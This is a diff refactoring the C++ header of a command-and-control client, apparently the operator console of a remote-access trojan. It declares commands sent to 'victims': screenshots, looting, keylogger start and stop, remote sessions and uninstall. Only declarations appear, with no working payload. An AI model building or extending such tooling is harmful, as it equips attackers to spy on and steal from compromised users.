@@ -6,11 +6,10 @@
 #include "CommandManager.hpp"
 #include "VictimManager.hpp"
 #include "SessionManager.hpp"
+#include "RestGateway.hpp"
 
-#include <cpppwn.hpp>
-
+#include <atomic>
 #include <string>
-
 
 class Client {
 private:
@@ -22,17 +21,17 @@ private:
     VictimManager& m_vic_man;
     SessionManager& m_sess_man;
 
-    cpppwn::RESTClient m_rest_client;
+    RestGateway m_gateway;
     std::string m_status_text;
 
     size_t m_last_id;
+    std::atomic<size_t> m_victim_count{0};
 
-    mutable size_t victim_count;
+    void updateStatusText();
 
-    void updateStatusText() noexcept;
+    [[nodiscard]] bool post_victim_command(const UUID& client_id, const std::string& command_text, const char* failure_label);
 
 public:
-    // Delete copy and move constructors/assignments (singleton pattern)
     Client(const Client&) = delete;
     Client& operator=(const Client&) = delete;
     Client(Client&&) = delete;
@@ -41,89 +40,49 @@ public:
 
     static Client& instance(const std::string& db_path = "client.db");
 
-    [[nodiscard]]
-    bool hasServerSession() const noexcept;
+    [[nodiscard]] bool hasServerSession() const;
 
-    [[nodiscard]]
-    std::string getUsername() const noexcept;
+    [[nodiscard]] std::string getUsername() const;
+    [[nodiscard]] std::string getPassword() const;
+    [[nodiscard]] std::string getServerUrl() const;
+    [[nodiscard]] std::string getServerHost() const;
+    [[nodiscard]] std::string getVictimBeaconUrl() const;
+    [[nodiscard]] std::string getTimeout() const;
+    [[nodiscard]] std::string getOutputPath() const;
 
-    [[nodiscard]]
-    std::string getPassword() const noexcept;
+    void setUsername(const std::string& username);
+    void setPassword(const std::string& password);
+    void setServerUrl(const std::string& server_url);
+    void setTimeout(const std::string& timeout);
+    void setOutputPath(const std::string& output_path);
 
-    [[nodiscard]]
-    std::string getServerUrl() const noexcept;
+    [[nodiscard]] const char* getStatusText() const;
+    [[nodiscard]] const std::vector<Victim>& getVictims() const;
 
-    [[nodiscard]]
-    std::string getServerHost() const noexcept;
-
-    [[nodiscard]]
-    std::string getVictimBeaconUrl() const noexcept;
-
-    [[nodiscard]]
-    std::string getTimeout() const noexcept;
-
-    [[nodiscard]]
-    std::string getOutputPath() const noexcept;
-
-    void setUsername(const std::string& username) noexcept;
-
-    void setPassword(const std::string& password) noexcept;
-
-    void setServerUrl(const std::string& server_url) noexcept;
-
-    void setTimeout(const std::string& timeout) noexcept;
-
-    void setOutputPath(const std::string& output_path) noexcept;
-
-    const char* getStatusText() const noexcept;
-
-    const std::vector<Victim>& getVictims() const noexcept;
-
-    // REST Methods
-    [[nodiscard]] bool login() noexcept;
-
-    [[nodiscard]] bool fetchVictims() noexcept;
+    [[nodiscard]] bool login();
+    [[nodiscard]] bool fetchVictims();
+    [[nodiscard]] bool fetchLogs();
+    [[nodiscard]] bool sendLogBuffer();
 
     [[nodiscard]] bool sendTimeoutCommand(const UUID& client_id, int timeout);
-
     [[nodiscard]] bool sendOpenSessionCommand(const UUID& client_id, int64_t port);
-
     [[nodiscard]] bool sendCloseSessionCommand(const UUID& client_id);
-
     [[nodiscard]] bool sendScreenshotCommand(const UUID& client_id);
-
     [[nodiscard]] bool sendLootCommand(const UUID& client_id);
-
     [[nodiscard]] bool sendStartKeyloggerCommand(const UUID& client_id);
-
     [[nodiscard]] bool sendStopKeyloggerCommand(const UUID& client_id);
-
     [[nodiscard]] bool sendUninstallCommand(const UUID& client_id);
 
     [[nodiscard]] bool sendTimeoutCommand(int64_t client_id, int timeout);
-
     [[nodiscard]] bool sendOpenSessionCommand(int64_t client_id, int64_t port);
-
     [[nodiscard]] bool sendCloseSessionCommand(int64_t client_id);
-
     [[nodiscard]] bool sendScreenshotCommand(int64_t client_id);
-
     [[nodiscard]] bool sendLootCommand(int64_t client_id);
-
     [[nodiscard]] bool sendStartKeyloggerCommand(int64_t client_id);
-
     [[nodiscard]] bool sendStopKeyloggerCommand(int64_t client_id);
-
     [[nodiscard]] bool sendUninstallCommand(int64_t client_id);
 
     [[nodiscard]] bool openSession(int64_t port);
-
     [[nodiscard]] bool closeSession(int64_t port);
-
-    // Logs
-    [[nodiscard]] bool fetchLogs() noexcept;
-    [[nodiscard]] bool sendLogBuffer();
-
-    // Victim Templates
     [[nodiscard]] bool registerTemplate(const std::string& username, const std::string& password);
 };
